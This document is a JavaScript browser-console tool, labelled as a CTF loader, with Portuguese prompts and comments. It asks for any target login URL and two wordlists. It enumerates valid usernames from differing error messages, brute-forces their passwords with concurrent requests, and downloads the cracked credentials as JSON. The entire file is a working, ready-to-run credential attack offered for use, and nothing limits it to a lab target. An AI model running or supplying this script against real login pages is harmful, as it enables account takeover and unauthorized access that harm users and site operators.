(async () => {
  const TARGET = prompt(
    "Informe a URL alvo (ex: https://alvo.com/login):"
  );

  const concurrencyUsers = Math.max(
    1,
    parseInt(prompt("Workers fase USERNAMES (concurrency)", "6"), 10) || 6
  );

  const concurrencyPasswords = Math.max(
    1,
    parseInt(prompt("Workers fase PASSWORDS por username (concurrency)", "8"), 10) || 8
  );

  const perRequestDelay = 50; // ms entre requests por worker
  const baseURL = TARGET;

  console.log("%c[CTF Loader]", "color: #0ff; font-weight: bold;");
  console.log("Selecione as duas wordlists: primeiro USERNAMES, depois PASSWORDS.");

  const container = document.createElement("div");
  container.style.position = "fixed";
  container.style.top = "10px";
  container.style.right = "10px";
  container.style.zIndex = "9999";
  container.style.background = "rgba(0,0,0,0.8)";
  container.style.padding = "10px";
  container.style.borderRadius = "10px";
  container.style.color = "#0f0";
  container.style.fontFamily = "monospace";
  container.innerHTML = `
    <p style="margin:0 0 8px 0;">Selecione as duas wordlists:</p>
    <label style="font-size:12px;color:#7efc7e">Usernames (primeiro)</label><br>
    <input type="file" id="usernamesInput" accept=".txt"><br><br>
    <label style="font-size:12px;color:#7efc7e">Passwords (segundo)</label><br>
    <input type="file" id="passwordsInput" accept=".txt"><br><br>
    <button id="startBtn" style="background:#081; color:#001; padding:6px 10px; border-radius:6px; font-weight:bold;">Iniciar testes</button>
    <div style="margin-top:8px; font-size:11px; color:#9f9">URL: <span id="targetDisplay"></span></div>
    <div style="font-size:11px; color:#9f9">Workers (users/passwords): <span id="workersDisplay"></span></div>
  `;
  document.body.appendChild(container);
  document.getElementById("targetDisplay").innerText = baseURL;
  document.getElementById("workersDisplay").innerText = `${concurrencyUsers} / ${concurrencyPasswords}`;

  // util para ler arquivo como array de linhas (preserva ordem)
  const getFileLines = async (input) => {
    const file = input.files[0];
    if (!file) throw new Error("Arquivo não selecionado");
    // leitura simples via text() — mantém compatibilidade e simplicidade da UI
    const text = await file.text();
    return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  };

  document.getElementById("startBtn").addEventListener("click", async () => {
    const usernamesInput = document.getElementById("usernamesInput");
    const passwordsInput = document.getElementById("passwordsInput");

    if (!usernamesInput.files[0] || !passwordsInput.files[0]) {
      alert("Selecione os dois arquivos antes de iniciar.");
      return;
    }

    container.remove(); // limpa UI antes de iniciar
    console.log("%c[+] Iniciando processo...", "color: yellow");

    const usernames = await getFileLines(usernamesInput);
    const passwords = await getFileLines(passwordsInput);

    console.log("%c[FASE 1] Testando usernames com senha fixa...", "color: cyan");
    const validUsers = [];
    const results = {};
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    // Fase 1: Testar usernames com workers (concurrencyUsers)
    let indexUser = 0;
    async function userWorker() {
      while (indexUser < usernames.length) {
        const username = usernames[indexUser++];
        try {
          const res = await fetch(baseURL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `username=${encodeURIComponent(username)}&password=12345678`
          });
          const body = await res.text();
          if (!body.includes("Invalid username")) {
            console.log("%c[+] USERNAME VÁLIDO:", "color: lime", username);
            validUsers.push(username);
          }
        } catch (err) {
          console.warn("[!] Erro username:", username, err);
        }
        await sleep(perRequestDelay);
      }
    }

    await Promise.all(Array(concurrencyUsers).fill(0).map(() => userWorker()));
    console.log("%c[FASE 1 FINALIZADA]", "color: cyan", "Total válidos:", validUsers.length);

    // Fase 2: para cada username válido testar passwords com pool de workers
    console.log("%c[FASE 2] Testando senhas para cada username válido...", "color: orange");

    for (const username of validUsers) {
      console.log("%c[→] Testando senhas para:", "color: yellow", username);
      let found = false;
      let indexPass = 0;
      let stop = false;

      async function passWorker() {
        while (indexPass < passwords.length && !stop) {
          const password = passwords[indexPass++];
          try {
            const res = await fetch(baseURL, {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
            });
            const body = await res.text();
            if (!body.includes("Incorrect password")) {
              console.log("%c[+] SENHA ENCONTRADA:", "color: lime", username, "→", password);
              results[username] = password;
              stop = true;
              found = true;
              break;
            }
          } catch (err) {
            console.warn("[!] Erro senha:", password, err);
          }
          await sleep(perRequestDelay);
        }
      }

      await Promise.all(Array(concurrencyPasswords).fill(0).map(() => passWorker()));

      if (!found) {
        console.log("%c[-] Nenhuma senha válida encontrada para", "color: gray", username);
      }

      await sleep(100);
    }

    // Download dos resultados finais
    console.log("%c[✔] Testes concluídos!", "color: lime");
    console.log("Resultados:", results);

    const blob = new Blob([JSON.stringify(results, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `resultado_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
    console.log("Download do JSON iniciado.");
  });
})();